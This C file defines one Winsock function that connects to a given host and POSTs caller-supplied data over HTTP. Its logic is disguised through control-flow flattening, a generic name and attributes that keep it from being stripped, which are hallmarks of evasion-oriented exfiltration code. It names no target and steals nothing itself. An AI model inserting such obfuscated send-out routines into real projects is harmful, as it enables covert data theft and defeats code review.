#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

void __attribute__((noinline)) __attribute__((used)) routine_v5(const char* host, const char* path, const char* data){
    int state = 10;
    WSADATA wsa;
    SOCKET s = INVALID_SOCKET;
    struct addrinfo* res = NULL;
    struct addrinfo hints;
    char req[1024];
    char buf[1024];

    while (state != 0) {
        switch (state) {
            case 10:
                state = (WSAStartup(0x0202, &wsa) == 0) ? 20 : 0;
                break;
            case 20:
                memset(&hints, 0, sizeof(hints));
                hints.ai_family = AF_INET;
                hints.ai_socktype = SOCK_STREAM;
                state = (getaddrinfo(host, "80", &hints, &res) == 0) ? 30 : 70;
                break;
            case 30:
                s = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
                state = (s != INVALID_SOCKET) ? 40 : 60;
                break;
            case 40:
                state = (connect(s, res->ai_addr, (int)res->ai_addrlen) != SOCKET_ERROR) ? 50 : 60;
                break;
            case 50:
                wsprintfA(req, "POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\n\r\n%s", path, host, (int)strlen(data), data);
                send(s, req, (int)strlen(req), 0);
                while (recv(s, buf, 1024, 0) > 0);
                state = 60;
                break;
            case 60:
                if (s != INVALID_SOCKET) closesocket(s);
                state = 70;
                break;
            case 70:
                if (res) freeaddrinfo(res);
                WSACleanup();
                state = 0;
                break;
        }
    }
}